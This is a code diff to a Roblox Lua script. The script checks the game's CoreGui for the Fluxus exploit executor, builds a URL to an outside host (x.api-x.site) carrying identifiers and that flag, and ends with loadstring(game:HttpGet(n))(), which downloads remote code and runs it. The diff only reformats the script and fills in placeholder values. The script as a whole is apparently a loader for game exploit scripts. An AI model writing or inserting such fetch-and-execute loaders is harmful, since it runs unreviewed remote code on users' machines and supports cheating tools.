@@ -1,13 +1,16 @@
 local function checkFluxus()
-  for _,inst in pairs(game:GetService("CoreGui"):GetChildren())do
-    if string.match(inst.Name:lower(),"fluxus")then
-      return"F"
+    for _, inst in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if string.match(inst.Name:lower(), "fluxus") then
+            return "F"
+        end
     end
-  end
-  return"N"
+    return "N"
 end
-_G.v={}
-table.insert(_G.v,'s1')
-local fluxusStatus=checkFluxus()
-local n=string.format("https://x.api-x.site?i=%s&s=%d&f=%s",'${i}',${s},fluxusStatus)
+
+_G.v = {}
+table.insert(_G.v, 's1')
+local i = "valor"
+local s = 1
+local fluxusStatus = checkFluxus()
+local n = string.format("https://x.api-x.site?i=%s&s=%d&f=%s", i, s, fluxusStatus)
 loadstring(game:HttpGet(n))()
